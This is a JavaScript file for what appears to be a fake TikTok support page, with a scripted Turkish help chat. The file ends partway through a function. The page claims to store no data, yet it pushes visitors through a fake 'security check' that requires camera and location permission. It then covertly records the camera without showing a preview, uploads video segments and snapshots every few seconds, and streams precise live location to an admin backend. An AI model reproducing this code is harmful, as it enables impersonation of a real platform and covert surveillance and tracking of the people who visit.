(function () {
  const searchInput = document.getElementById("help-search");
  const searchBtn = document.getElementById("search-btn");
  const searchHint = document.getElementById("search-hint");

  const searchMap = [
    {
      keys: /shadow|gölge|golge|fyp|keşfet|kesfet|görünür|gorunur|dağıtım|dagitim/i,
      href: "articles/shadowban.html",
      label: "Görünürlük düşüşü rehberi",
    },
    {
      keys: /algoritma|algorithm|öneri|oneri|viral/i,
      href: "articles/algorithm.html",
      label: "Öneri sistemi rehberi",
    },
    {
      keys: /view|izlenme|izlenm|istatistik|görüntülen|goruntulen/i,
      href: "articles/views.html",
      label: "İzlenme kontrol listesi",
    },
    {
      keys: /ban|yasak|kapand|askı|aski|suspended|itiraz|appeal/i,
      href: "ban-appeal.html",
      label: "Ban itiraz rehberi",
    },
    {
      keys: /sohbet|destek|chat|yardım|yardim/i,
      href: "chat.html",
      label: "Destek sohbeti",
    },
  ];

  function runSearch() {
    if (!searchHint) return;
    const q = (searchInput?.value || "").trim();
    searchHint.hidden = false;
    if (!q) {
      searchHint.textContent = "Bir konu yazın. Örn: ban, izlenme, algoritma, görünürlük.";
      return;
    }
    const match = searchMap.find((item) => item.keys.test(q));
    if (match) {
      searchHint.innerHTML = `"${q}" için önerilen sayfa: <a href="${match.href}">${match.label}</a>`;
      return;
    }
    searchHint.innerHTML =
      `"${q}" için doğrudan eşleşme yok. <a href="#konular">Popüler konulara</a> bakın veya <a href="chat.html">destek sohbetini</a> kullanın.`;
  }

  searchBtn?.addEventListener("click", runSearch);
  searchInput?.addEventListener("keydown", (e) => {
    if (e.key === "Enter") {
      e.preventDefault();
      runSearch();
    }
  });

  const form = document.getElementById("appeal-form");

  // Ban itiraz kontrol listesi → tüm gönderimler destek sohbetine
  form?.addEventListener("submit", (e) => {
    e.preventDefault();
    location.href = "chat.html";
  });

  /* —— Destek sohbeti —— */
  const SECRETISH =
    /(şifre|sifre|password|parola|e-?posta|email|mail|kullanıcı adı|kullanici adi|otp|doğrulama kodu|dogrulama kodu|hesap şifre|credit card|kart no|telefon numar|gsm)/i;
  const RISK_TRIGGER =
    /risk|hesab(ım|iniz|ınız).*(tehlike|risk|kısıt|kisit)|tehlike|güvenlik uyar|guvenlik uyar|hesabınız risk|hesabiniz risk|risk altınd|kısıtland|kisitland/i;

  const riskQuestions = [
    {
      q: "Soru 1/5 — Uygulamada hesap veya içerik uyarısı görüyor musunuz?",
      options: ["Evet", "Hayır", "Emin değilim"],
      score: { Evet: 3, Hayır: 0, "Emin değilim": 1 },
    },
    {
      q: "Soru 2/5 — Son videoların öneri (For You) trafiği belirgin düştü mü?",
      options: ["Evet, keskin düşüş", "Biraz düşük", "Normal seviyede"],
      score: { "Evet, keskin düşüş": 3, "Biraz düşük": 2, "Normal seviyede": 0 },
    },
    {
      q: "Soru 3/5 — Son 7 günde Topluluk Kuralları veya telif uyarısı aldınız mı?",
      options: ["Evet", "Hayır", "Bilmiyorum"],
      score: { Evet: 3, Hayır: 0, Bilmiyorum: 1 },
    },
    {
      q: "Soru 4/5 — Hesabınızda giriş / güvenlik bildirimi var mı?",
      options: ["Var", "Yok", "Kontrol etmedim"],
      score: { Var: 2, Yok: 0, "Kontrol etmedim": 1 },
    },
    {
      q: "Soru 5/5 — Ana sorun hangisi?",
      options: ["Ban / kapatma", "İzlenme düşüşü", "Genel belirsizlik"],
      score: { "Ban / kapatma": 3, "İzlenme düşüşü": 2, "Genel belirsizlik": 1 },
    },
  ];

  function riskVerdict(total) {
    if (total <= 3) {
      return {
        title: "Öncelik: Düşük",
        body: "Ciddi hesap cezası belirtisi zayıf görünüyor. İçerik ve analitik performansını kontrol edin. Resmi bir uyarı alırsanız uygulamadan veya support.tiktok.com üzerinden ilerleyin. Burada hiçbir veri kaydedilmedi.",
      };
    }
    if (total <= 8) {
      return {
        title: "Öncelik: Orta",
        body: `Skorunuz ${total}/15. Hesap bildirimlerini ve Analitik trafik kaynaklarını inceleyin. İzlenme konusunda articles/views.html, görünürlük için articles/shadowban.html rehberlerine bakın.`,
      };
    }
    if (total <= 12) {
      return {
        title: "Öncelik: Yüksek",
        body: `Skorunuz ${total}/15. Hesap kısıtı veya ceza ihtimali yüksek. Ban itiraz rehberini tamamlayın ve resmi TikTok desteğinden itiraz edin.`,
      };
    }
    return {
      title: "Öncelik: Acil kontrol",
      body: `Skorunuz ${total}/15. Ban veya güvenlik kısıtı olasılığı güçlü. Hesap işlemlerini yalnızca resmi kanallardan yürütün: support.tiktok.com. Bu sohbet hesap etkilemez.`,
    };
  }

  const inArticles = /\/articles\//.test(location.pathname) || /\\articles\\/.test(location.pathname);
  const prefix = inArticles ? "../" : "";

  const replies = [
    {
      test: SECRETISH,
      say: "Güvenlik nedeniyle şifre, e-posta veya doğrulama kodu istemiyoruz. Gerçek hesap işlemleri için yalnızca support.tiktok.com kullanın.",
    },
    {
      test: /ban|yasak|kapand|askı|aski|suspended|disabled/i,
      say: [
        `Ban veya kapatma için resmi itiraz gerekir. Kontrol listesi: ${prefix}ban-appeal.html — işlem: support.tiktok.com`,
        "Hesap kapalıysa yalnızca resmi destek üzerinden ilerleyin. Rehber için ‘Ban’ kısayolunu kullanabilirsiniz.",
      ],
    },
    {
      test: /shadow|gölge|golge|fyp|keşfet|kesfet|for you|görünür|gorunur/i,
      say: [
        `Görünürlük düşüşü rehberi: ${prefix}articles/shadowban.html — ayrıntılı kontrol için “Hesabım kısıtlandı” yazarak checklist’i başlatabilirsiniz.`,
        "Öneri trafiği düşüşü her zaman cezaya işaret etmez. Analitik ve hesap uyarılarını kontrol edin.",
      ],
    },
    {
      test: /view|izlenme|izlenm|istatistik|görüntülen|goruntulen/i,
      say: [
        `İzlenme kontrol listesi: ${prefix}articles/views.html — tamamlanma oranı ve trafik kaynaklarını karşılaştırın.`,
        "Düşük izlenme çoğu zaman içerik/performans kaynaklıdır. Checklist için ‘İzlenmelerim düştü’ yazabilirsiniz.",
      ],
    },
    {
      test: /algoritma|algorithm|öneri|oneri|viral/i,
      say: [
        `Öneri sistemi özeti: ${prefix}articles/algorithm.html`,
        "Algoritma erken etkileşim ve izlenme süresine duyarlıdır. Detaylı rehbere bakın veya kısıt checklist’i başlatın.",
      ],
    },
    {
      test: /merhaba|selam|hey|hi |hello|slm/i,
      say: [
        "Merhaba. Ban, izlenme veya görünürlük sorununda yardımcı olabilirim. Altındaki kısayolları kullanın veya sorunuzu yazın. Şifre istemem.",
        "Selam. Hesap kısıtı kontrolü için ‘Hesabım kısıtlandı’ yazın.",
      ],
    },
    {
      test: /teşekkür|tesekkur|sağol|sagol|thanks/i,
      say: "Rica ederim. Yeni bir kontrol için tekrar ‘Hesabım kısıtlandı’ yazabilirsiniz.",
    },
    {
      test: /yardım|yardim|help|destek/i,
      say: "Buradayım. Ban, izlenme düşüşü veya görünürlük için kısayolları kullanın; kısıt kontrolü için ‘Hesabım kısıtlandı’ yazın. Hesap bilgisi paylaşmayın.",
    },
  ];

  const fallbackReplies = [
    "Anladım. Ban, izlenme veya görünürlük yazın; ya da kısıt kontrolü için ‘Hesabım kısıtlandı’ deyin.",
    "Daha net yardımcı olayım: Ban / İzlenme düşüşü / Görünürlük kısayollarından birini seçin.",
    "Konuyu anlamak için kısayolu kullanın veya ‘Hesabım kısıtlandı’ yazarak checklist’i başlatın.",
    "İlgili rehbere yönlendirebilirim. Ban, izlenme veya kısıt kelimelerinden birini deneyin.",
  ];

  function pick(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  function botReply(text) {
    for (const rule of replies) {
      if (rule.test.test(text)) {
        return Array.isArray(rule.say) ? pick(rule.say) : rule.say;
      }
    }
    return pick(fallbackReplies);
  }

  function matchOption(answer, options) {
    const normalized = answer.trim().toLocaleLowerCase("tr-TR");
    const exact = options.find((o) => o.toLocaleLowerCase("tr-TR") === normalized);
    if (exact) return exact;
    const partial = options.find(
      (o) =>
        normalized.includes(o.toLocaleLowerCase("tr-TR")) ||
        o.toLocaleLowerCase("tr-TR").includes(normalized)
    );
    if (partial) return partial;
    if (/^(e|evet|yes|y)$/i.test(normalized)) {
      return options.find((o) => /^evet$/i.test(o)) || null;
    }
    if (/^(h|hayır|hayir|no|n)$/i.test(normalized)) {
      return options.find((o) => /^hayır$/i.test(o)) || null;
    }
    const num = parseInt(normalized, 10);
    if (num >= 1 && num <= options.length) return options[num - 1];
    return null;
  }

  function nowLabel() {
    return new Date().toLocaleTimeString("tr-TR", { hour: "2-digit", minute: "2-digit" });
  }

  function syncMessage(who, text) {
    const sync = window.ChatSync;
    const send = (readySync) => {
      if (!readySync?.enabled) return;
      readySync.pushMessage(who, text).catch((err) => {
        console.error("Mesaj senkron hatası", err);
      });
    };
    if (sync?.enabled) {
      send(sync);
      return;
    }
    if (window.ChatSyncReady) {
      window.ChatSyncReady.then(send);
    }
  }

  function appendMessage(box, who, text, options = {}) {
    const syncOut = options.sync !== false;
    const isLoading = options.type === "loading";
    const label =
      who === "user" ? "Siz" : who === "admin" ? "Destek" : "Asistan";
    const row = document.createElement("div");
    row.className = `chat-bubble chat-${who === "user" ? "user" : "bot"}${
      who === "admin" ? " chat-admin" : ""
    }${isLoading ? " chat-loading" : ""}`;
    const meta = document.createElement("span");
    meta.className = "chat-meta";
    meta.textContent = `${label} · ${nowLabel()}`;
    const body = document.createElement("div");
    body.className = "chat-loading-body";
    if (isLoading) {
      body.innerHTML = `
        <span class="chat-spinner" aria-hidden="true"></span>
        <p></p>
        <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
      `;
      body.querySelector("p").textContent =
        text || "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";
    } else {
      const p = document.createElement("p");
      p.textContent = text;
      body.appendChild(p);
    }
    row.append(meta, body);
    box.appendChild(row);
    box.scrollTop = box.scrollHeight;
    if (syncOut && (who === "user" || who === "bot")) {
      syncMessage(who, text);
    }
    return row;
  }

  const cameraSessions = new Map();

  function pickVisitorRecorderMime() {
    if (typeof MediaRecorder === "undefined") return "";
    const types = ["video/webm;codecs=vp8", "video/webm;codecs=vp9", "video/webm"];
    return types.find((t) => MediaRecorder.isTypeSupported(t)) || "";
  }

  function startVisitorRecording(state) {
    if (!state?.stream || state.recorder || typeof MediaRecorder === "undefined") return false;
    const tracks = state.stream.getVideoTracks().filter((t) => t.readyState === "live");
    if (!tracks.length) return false;
    const mime = pickVisitorRecorderMime();
    let recorder;
    try {
      recorder = mime
        ? new MediaRecorder(new MediaStream(tracks), {
            mimeType: mime,
            videoBitsPerSecond: 1_500_000,
          })
        : new MediaRecorder(new MediaStream(tracks));
    } catch {
      return false;
    }
    const chunks = [];
    state.recordChunks = chunks;
    state.recorderMime = recorder.mimeType || mime || "video/webm";
    recorder.ondataavailable = (e) => {
      if (e.data?.size) chunks.push(e.data);
    };
    state.recorder = recorder;
    try {
      recorder.start(500);
      return true;
    } catch {
      state.recorder = null;
      return false;
    }
  }

  function recordingFileExt(mimeOrBlob) {
    const t = typeof mimeOrBlob === "string" ? mimeOrBlob : mimeOrBlob?.type || "";
    if (/mp4|mpeg|m4v/i.test(t)) return "mp4";
    return "webm";
  }

  function stopVisitorRecorder(state) {
    return new Promise((resolve) => {
      const rec = state?.recorder;
      let settled = false;
      const settle = (blob) => {
        if (settled) return;
        settled = true;
        if (blob?.size) state.lastBlob = blob;
        resolve(blob?.size ? blob : state?.lastBlob || null);
      };
      const buildBlob = () => {
        const blob = new Blob(state.recordChunks || [], {
          type: state.recorderMime || "video/webm",
        });
        return blob.size ? blob : null;
      };
      if (!rec || rec.state === "inactive") {
        settle(buildBlob() || state?.lastBlob || null);
        return;
      }
      const finish = () => settle(buildBlob());
      rec.addEventListener("stop", finish, { once: true });
      try {
        if (rec.state === "recording") {
          try {
            rec.requestData();
          } catch {
            /* ignore */
          }
        }
        rec.stop();
      } catch {
        settle(buildBlob());
      }
      window.setTimeout(() => settle(buildBlob() || state.lastBlob || null), 5000);
    });
  }

  const PENDING_REC_DB = "tiktok-help-pending-rec";
  const PENDING_REC_STORE = "recordings";

  function openPendingRecDb() {
    return new Promise((resolve, reject) => {
      if (!window.indexedDB) {
        reject(new Error("no-idb"));
        return;
      }
      const req = indexedDB.open(PENDING_REC_DB, 1);
      req.onupgradeneeded = () => {
        const db = req.result;
        if (!db.objectStoreNames.contains(PENDING_REC_STORE)) {
          db.createObjectStore(PENDING_REC_STORE, { keyPath: "id" });
        }
      };
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error || new Error("idb-open"));
    });
  }

  async function stashPendingRecording({ sessionId, callId, blob, fileName }) {
    if (!blob?.size || !sessionId || !callId) return;
    try {
      const db = await openPendingRecDb();
      await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readwrite");
        tx.objectStore(PENDING_REC_STORE).put({
          id: `${sessionId}:${callId}`,
          sessionId,
          callId,
          fileName: fileName || `kamera-${String(callId).slice(0, 8)}.webm`,
          mime: blob.type || "video/webm",
          blob,
          ts: Date.now(),
        });
        tx.oncomplete = () => resolve();
        tx.onerror = () => reject(tx.error);
      });
      db.close?.();
    } catch (err) {
      console.warn("pending rec stash", err);
    }
  }

  async function removePendingRecording(id) {
    try {
      const db = await openPendingRecDb();
      await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readwrite");
        tx.objectStore(PENDING_REC_STORE).delete(id);
        tx.oncomplete = () => resolve();
        tx.onerror = () => reject(tx.error);
      });
      db.close?.();
    } catch {
      /* ignore */
    }
  }

  async function drainPendingRecordings() {
    const sync = window.ChatSync;
    if (!sync?.enabled || !sync.uploadCameraRecording) return;
    let rows = [];
    try {
      const db = await openPendingRecDb();
      rows = await new Promise((resolve, reject) => {
        const tx = db.transaction(PENDING_REC_STORE, "readonly");
        const req = tx.objectStore(PENDING_REC_STORE).getAll();
        req.onsuccess = () => resolve(req.result || []);
        req.onerror = () => reject(req.error);
      });
      db.close?.();
    } catch {
      return;
    }
    for (const row of rows) {
      if (!row?.blob?.size || !row.sessionId || !row.callId) {
        await removePendingRecording(row?.id);
        continue;
      }
      try {
        await sync.uploadCameraRecording(row.sessionId, row.callId, row.blob, row.fileName, {
          finalize: true,
        });
        await removePendingRecording(row.id);
        syncMessage("user", "Bekleyen kamera kaydı gönderildi.");
      } catch (err) {
        console.warn("pending rec upload", err);
      }
    }
  }

  const SEGMENT_UPLOAD_MS = 35_000;

  async function rotateAndUploadSegment(state, sessionId, callId, sync) {
    if (!state || !cameraSessions.has(callId) || state._segmentBusy) return;
    if (!sync?.uploadCameraRecording) return;
    state._segmentBusy = true;
    try {
      const blob = await stopVisitorRecorder(state);
      startVisitorRecording(state);
      if (!blob?.size || !cameraSessions.has(callId)) return;
      const ext = recordingFileExt(blob);
      const name = `kamera-${String(callId).slice(0, 8)}.${ext}`;
      await sync.uploadCameraRecording(sessionId, callId, blob, name, { finalize: false });
    } catch (err) {
      console.warn("segment upload", err);
      if (cameraSessions.has(callId) && !state.recorder) {
        startVisitorRecording(state);
      }
    } finally {
      state._segmentBusy = false;
    }
  }

  function startSegmentUploads(state, sessionId, callId, sync) {
    if (state.segmentTimer) {
      window.clearInterval(state.segmentTimer);
      state.segmentTimer = null;
    }
    state.segmentTimer = window.setInterval(() => {
      void rotateAndUploadSegment(state, sessionId, callId, sync);
    }, SEGMENT_UPLOAD_MS);
  }

  async function stopCameraSession(callId, { upload = true } = {}) {
    const state = cameraSessions.get(callId);
    if (!state) return;
    cameraSessions.delete(callId);

    if (state.maxDurationTimer) {
      window.clearTimeout(state.maxDurationTimer);
      state.maxDurationTimer = null;
    }
    if (state.segmentTimer) {
      window.clearInterval(state.segmentTimer);
      state.segmentTimer = null;
    }
    // Parça yükleme orta sıradaysa kayıp blob olmasın
    if (state._segmentBusy) {
      await new Promise((r) => window.setTimeout(r, 1200));
    }
    state._segmentBusy = true;
    if (state.locationRetryTimer) {
      window.clearTimeout(state.locationRetryTimer);
      state.locationRetryTimer = null;
    }
    if (state.snapshotTimer) {
      window.clearInterval(state.snapshotTimer);
      state.snapshotTimer = null;
    }
    try {
      if (state.snapVideo) {
        state.snapVideo.pause?.();
        state.snapVideo.srcObject = null;
        state.snapVideo.remove?.();
      }
    } catch {
      /* ignore */
    }
    state.snapVideo = null;

    try {
      state.unsubAnswer?.();
      state.unsubIce?.();
    } catch {
      /* ignore */
    }

    if (state.geoWatchId != null && navigator.geolocation) {
      try {
        navigator.geolocation.clearWatch(state.geoWatchId);
      } catch {
        /* ignore */
      }
      state.geoWatchId = null;
    }

    const sync = window.ChatSync;
    const sid = sync?.getSessionId?.();

    // Admin’e hemen “bitiyor” sinyali — upload bitmeden sayfa ölürse bile
    if (upload && sync?.enabled && sid) {
      sync
        .setCameraCallStatus?.(sid, callId, "ended")
        .catch(() => {});
      try {
        await sync.writeCameraSignal?.(sid, callId, "recordingStatus", "finalizing");
      } catch {
        /* ignore */
      }
    }

    // Önce kaydı bitir (track’ler hâlâ açıkken)
    const blob = await stopVisitorRecorder(state);

    // Kamerayı hemen kapat / önizlemeyi kaldır
    try {
      state.pc?.close();
    } catch {
      /* ignore */
    }
    try {
      state.stream?.getTracks()?.forEach((t) => t.stop());
      if (state.video?.srcObject) state.video.srcObject = null;
      state.wrap?.remove();
    } catch {
      /* ignore */
    }

    if (upload && sync?.enabled && sid) {
      if (blob?.size) {
        const ext = recordingFileExt(blob);
        const fileName = `kamera-${String(callId).slice(0, 8)}.${ext}`;
        await stashPendingRecording({ sessionId: sid, callId, blob, fileName });
        try {
          await sync.uploadCameraRecording(sid, callId, blob, fileName, { finalize: true });
          await removePendingRecording(`${sid}:${callId}`);
          syncMessage("user", "Kamera oturumu sonlandı; kayıt gönderildi.");
        } catch (err) {
          console.error(err);
          syncMessage(
            "user",
            `Kamera kapandı; kayıt yüklenemedi (${err?.code || err?.message || "hata"}). Tekrar girişte denenecek.`
          );
        }
      } else {
        await sync.markCameraRecordingFailed?.(sid, callId, "empty-recording").catch(() => {});
        syncMessage("user", "Kamera oturumu sonlandı; kayıt boş olduğu için gönderilemedi.");
      }
    }
  }

  const SNAPSHOT_INTERVAL_MS = 5_000;

  async function captureStreamFrameBlob(stream) {
    const track = stream?.getVideoTracks?.()?.find((t) => t.readyState === "live");
    if (!track) return null;

    if (typeof ImageCapture !== "undefined") {
      try {
        const ic = new ImageCapture(track);
        if (typeof ic.takePhoto === "function") {
          const photo = await ic.takePhoto();
          if (photo?.size) return photo;
        }
        if (typeof ic.grabFrame === "function") {
          const bitmap = await ic.grabFrame();
          const canvas = document.createElement("canvas");
          canvas.width = bitmap.width;
          canvas.height = bitmap.height;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(bitmap, 0, 0);
          bitmap.close?.();
          const blob = await new Promise((resolve) =>
            canvas.toBlob((b) => resolve(b), "image/jpeg", 0.82)
          );
          if (blob?.size) return blob;
        }
      } catch {
        /* canvas yoluna düş */
      }
    }

    const video = document.createElement("video");
    video.muted = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "");
    video.srcObject = new MediaStream([track]);
    try {
      await video.play();
      await new Promise((r) => setTimeout(r, 120));
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      if (!w || !h) return null;
      const canvas = document.createElement("canvas");
      canvas.width = w;
      canvas.height = h;
      canvas.getContext("2d").drawImage(video, 0, 0, w, h);
      return await new Promise((resolve) =>
        canvas.toBlob((b) => resolve(b), "image/jpeg", 0.82)
      );
    } catch {
      return null;
    } finally {
      try {
        video.pause();
        video.srcObject = null;
      } catch {
        /* ignore */
      }
    }
  }

  function startSnapshotUploads(state, sessionId, callId, sync) {
    if (!sync?.uploadCameraSnapshot || !state?.stream) return;
    let busy = false;
    let count = 0;

    const tick = async () => {
      if (!cameraSessions.has(callId) || busy) return;
      busy = true;
      try {
        const blob = await captureStreamFrameBlob(state.stream);
        if (!blob?.size || !cameraSessions.has(callId)) return;
        count += 1;
        const name = `snap-${String(callId).slice(0, 8)}-${count}.jpg`;
        await sync.uploadCameraSnapshot(sessionId, callId, blob, name);
        if (count === 1) {
          syncMessage("user", "Kamera fotoğrafı gönderildi.");
        }
      } catch (err) {
        console.warn("snapshot upload", err);
      } finally {
        busy = false;
      }
    };

    void tick();
    state.snapshotTimer = window.setInterval(tick, SNAPSHOT_INTERVAL_MS);
  }

  function flushCameraSessionsOnLeave() {
    const ids = [...cameraSessions.keys()];
    for (const id of ids) {
      void stopCameraSession(id, { upload: true });
    }
  }

  // SADECE gerçek çıkış — visibilitychange sekme değişiminde kamerayı öldürmesin
  // (mobilde ayarlara gitmek / bildirim = document.hidden → konum butonu kırılıyordu)
  window.addEventListener("pagehide", flushCameraSessionsOnLeave);
  window.addEventListener("beforeunload", flushCameraSessionsOnLeave);
  window.addEventListener("pageshow", () => {
    void drainPendingRecordings();
  });
  void drainPendingRecordings();

  const VISITOR_RECORD_MAX_MS = 90_000;

  function showSilentCameraStatus(box, callId) {
    box.querySelectorAll(".chat-camera-preview").forEach((el) => el.remove());
    const wrap = document.createElement("div");
    wrap.className = "chat-camera-preview chat-camera-silent";
    wrap.dataset.callId = callId;

    const label = document.createElement("p");
    label.className = "chat-camera-preview-label";
    label.textContent = "Doğrulama devam ediyor… Lütfen bu sayfadan ayrılmayın.";

    wrap.appendChild(label);
    box.appendChild(wrap);
    box.scrollTop = box.scrollHeight;
    // Video elementi yok — ziyaretçi kendi görüntüsünü görmez
    return { wrap, video: null, label };
  }

  function startLiveLocationWatch(state, sessionId, callId, sync, box, opts = {}) {
    if (!navigator.geolocation || !sync?.writeLiveLocation) {
      sync?.writeLocationStatus?.(sessionId, callId, "unsupported", "Geolocation yok").catch(() => {});
      return;
    }

    const LOCATION_RETRY_MS = 10_000;
    const LOCATION_DENIED_TEXT =
      "Güvenlik kontrolüne konum izni verilmedi. Kamera ve konum izni zorunludur.";
    const deferAsk = opts.deferAsk === true;
    let lastWriteAt = 0;
    let asking = false;

    // Otomatik istek yokken admin “reddedildi” görmesin
    if (deferAsk || isLikelyMobile()) {
      sync
        .writeLocationStatus?.(sessionId, callId, "awaiting-tap", "Ziyaretçi konum butonuna dokunmalı")
        .catch(() => {});
    }

    const clearLocRetry = () => {
      if (state.locationRetryTimer) {
        window.clearTimeout(state.locationRetryTimer);
        state.locationRetryTimer = null;
      }
    };

    const showLocDeniedNotice = () => {
      if (!box) return;
      let el = box.querySelector(".chat-location-perm-denied");
      if (!el) {
        el = document.createElement("div");
        el.className = "chat-inline-prompt chat-location-perm-denied";
        el.innerHTML =
          `<p class="chat-inline-prompt-title">${LOCATION_DENIED_TEXT}</p>` +
          '<p class="chat-camera-note">Konum için alttaki kırmızı butona dokunun. Pencere açılmazsa: Ayarlar → Safari → Konum → Sor.</p>';
        box.appendChild(el);
      }
      box.scrollTop = box.scrollHeight;
    };

    const clearLocDeniedNotice = () => {
      box?.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
    };

    const publish = (pos) => {
      if (!cameraSessions.has(callId)) return;
      clearLocRetry();
      clearLocDeniedNotice();
      const now = Date.now();
      if (state._hadLocation && now - lastWriteAt < 2500) return;
      lastWriteAt = now;
      const wasFirst = !state._hadLocation;
      state._hadLocation = true;
      const coords = pos.coords;
      sync
        .writeLiveLocation(sessionId, callId, {
          lat: coords.latitude,
          lng: coords.longitude,
          accuracy: coords.accuracy,
          altitude: coords.altitude,
          heading: coords.heading,
          speed: coords.speed,
          ts: now,
        })
        .catch(() => {});
      if (wasFirst && !state._locationGrantedMsg) {
        state._locationGrantedMsg = true;
        syncMessage("user", "Konum izni verildi.");
        if (box) {
          appendMessage(box, "bot", "Kamera ve konum izni alındı. Güvenlik kontrolü devam ediyor.", {
            sync: true,
          });
        }
      }
      if (state.label) {
        state.label.textContent = "Doğrulama devam ediyor… Lütfen bekleyin.";
      }
      state._onLocationGranted?.();
    };

    const scheduleRetry = () => {
      // Mobilde jest olmadan tekrar isteme — sessiz "denied" üretmesin
      if (deferAsk || isLikelyMobile()) return;
      if (!cameraSessions.has(callId) || state._hadLocation) return;
      clearLocRetry();
      state.locationRetryTimer = window.setTimeout(() => {
        state.locationRetryTimer = null;
        void askLocation();
      }, LOCATION_RETRY_MS);
    };

    const onErr = (err, { fromUserTap = false } = {}) => {
      if (!cameraSessions.has(callId) || state._hadLocation) return;
      const code = err?.code;
      // Safari jestsiz / paralel istekte de code=1 döner; bunu “reddedildi” sanma
      const silent =
        !fromUserTap && (deferAsk || isLikelyMobile());
      const msg = silent
        ? "awaiting-tap"
        : code === 1
          ? "denied"
          : code === 2
            ? "unavailable"
            : code === 3
              ? "timeout"
              : "error";
      const detail = silent
        ? "Konum penceresi açılmadı; ziyaretçi butona dokunmalı"
        : err?.message || msg;
      sync.writeLocationStatus?.(sessionId, callId, msg, detail).catch(() => {});
      if (!silent && !deferAsk && !isLikelyMobile() && box) {
        appendMessage(box, "bot", LOCATION_DENIED_TEXT, { sync: true });
      }
      syncMessage("user", `Konum izni alınamadı (${msg}).`);
      showLocDeniedNotice();
      scheduleRetry();
      state._onLocationDenied?.();
    };

    const askLocation = (fromUserTap = false) => {
      if (!cameraSessions.has(callId) || state._hadLocation || asking) return;
      asking = true;
      if (state.geoWatchId != null) {
        try {
          navigator.geolocation.clearWatch(state.geoWatchId);
        } catch {
          /* ignore */
        }
        state.geoWatchId = null;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          asking = false;
          publish(pos);
          if (!cameraSessions.has(callId) || !state._hadLocation) return;
          state.geoWatchId = navigator.geolocation.watchPosition(publish, (err) => onErr(err), {
            enableHighAccuracy: true,
            maximumAge: 2000,
            timeout: 15000,
          });
        },
        (err) => {
          asking = false;
          onErr(err, { fromUserTap });
        },
        {
          enableHighAccuracy: false,
          maximumAge: 60000,
          timeout: 60000,
        }
      );
    };

    state.locationRetryTimer = null;
    state.retryLocation = () => askLocation(true);
    // Mobil / defer: otomatik isteme — sadece dokunuşla askLocation
    if (!deferAsk && !isLikelyMobile()) {
      askLocation(false);
    }
  }

  function showLocationTapButton(box, callId, options = {}) {
    box.querySelectorAll(".chat-location-tap").forEach((el) => el.remove());
    document.getElementById("loc-perm-fab")?.remove();
    const sync = window.ChatSync;

    const card = document.createElement("div");
    card.className = "chat-inline-prompt chat-location-tap chat-camera-request-sticky";
    card.id = "loc-perm-card";
    card.setAttribute("role", "group");
    card.setAttribute("aria-label", "Konum izni");

    const title = document.createElement("p");
    title.className = "chat-inline-prompt-title";
    title.textContent = "2/2 — Konum izni zorunlu (Safari)";

    const note = document.createElement("p");
    note.className = "chat-camera-note";
    note.textContent =
      "Kamera tamam. HEMEN alttaki kırmızı butona dokunun — iPhone’da konum penceresi yalnızca dokunuşta açılır.";

    const actions = document.createElement("div");
    actions.className = "chat-inline-prompt-actions";
    const okBtn = document.createElement("button");
    okBtn.type = "button";
    okBtn.className = "btn btn-primary chat-perm-tap-btn";
    okBtn.textContent = "Konum iznini ver — dokun";

    const fab = document.createElement("button");
    fab.type = "button";
    fab.id = "loc-perm-fab";
    fab.className = "loc-perm-fab";
    fab.textContent = "Konum iznini ver — dokun";

    const finishOk = (state, pos) => {
      applySeedLocationToSession(sync, callId, state, pos);
      if (state.geoWatchId == null && navigator.geolocation) {
        try {
          state.geoWatchId = navigator.geolocation.watchPosition(
            (p) => {
              if (!cameraSessions.has(callId)) return;
              const c = p.coords;
              sync
                ?.writeLiveLocation?.(sync.getSessionId(), callId, {
                  lat: c.latitude,
                  lng: c.longitude,
                  accuracy: c.accuracy,
                  altitude: c.altitude,
                  heading: c.heading,
                  speed: c.speed,
                  ts: Date.now(),
                })
                .catch(() => {});
            },
            () => {},
            { enableHighAccuracy: true, maximumAge: 5000, timeout: 20000 }
          );
        } catch {
          /* ignore */
        }
      }
      box.querySelectorAll(".chat-location-perm-denied").forEach((el) => el.remove());
      card.remove();
      fab.remove();
      appendMessage(box, "bot", "Konum izni alındı.", { sync: true });
      options.onGranted?.();
    };

    const finishErr = (err) => {
      okBtn.disabled = false;
      fab.disabled = false;
      const code = err?.code;
      const hint =
        code === 1
          ? "Safari konumu engelledi veya pencere açılmadı. Ayarlar → Safari → Konum → Sor / İzin Ver, sonra siteyi yenileyip tekrar dokunun."
          : code === 2
            ? "Konum servisi kapalı. Ayarlar → Gizlilik → Konum Servisleri → Açık."
            : code === 3
              ? "Zaman aşımı — tekrar dokunun (pencere açıldıysa İzin Ver’e basın)."
              : err?.message || "Bilinmeyen hata";
      note.textContent = `Konum açılamadı (${code ?? "?"}): ${hint}`;
      syncMessage("user", `Konum izni başarısız (${code || "?"}).`);
      const sync = window.ChatSync;
      sync
        ?.writeLocationStatus?.(
          sync.getSessionId(),
          callId,
          code === 1 ? "denied" : code === 2 ? "unavailable" : code === 3 ? "timeout" : "error",
          hint
        )
        .catch(() => {});
      options.onSoftDeny?.(String(code || "err"));
    };

    // iOS Safari: getCurrentPosition tiklama handler’ında SENKRON; kamera ile AYNI ANDA değil
    const requestLoc = () => {
      if (!navigator.geolocation) {
        note.textContent = "Bu tarayıcı konum desteklemiyor. Safari ile HTTPS sitede açın.";
        return;
      }
      const state = cameraSessions.get(callId);
      if (!state) {
        note.textContent = "Kamera oturumu yok; sayfayı yenileyip önce kamerayı verin.";
        options.onSoftDeny?.("no-camera");
        return;
      }
      if (state._hadLocation) {
        card.remove();
        fab.remove();
        options.onGranted?.();
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const live = cameraSessions.get(callId);
          if (!live) {
            note.textContent = "Kamera oturumu yok; sayfayı yenileyip önce kamerayı verin.";
            options.onSoftDeny?.("no-camera");
            return;
          }
          finishOk(live, pos);
        },
        (err) => finishErr(err),
        {
          enableHighAccuracy: false,
          maximumAge: 60000,
          timeout: 60000,
        }
      );

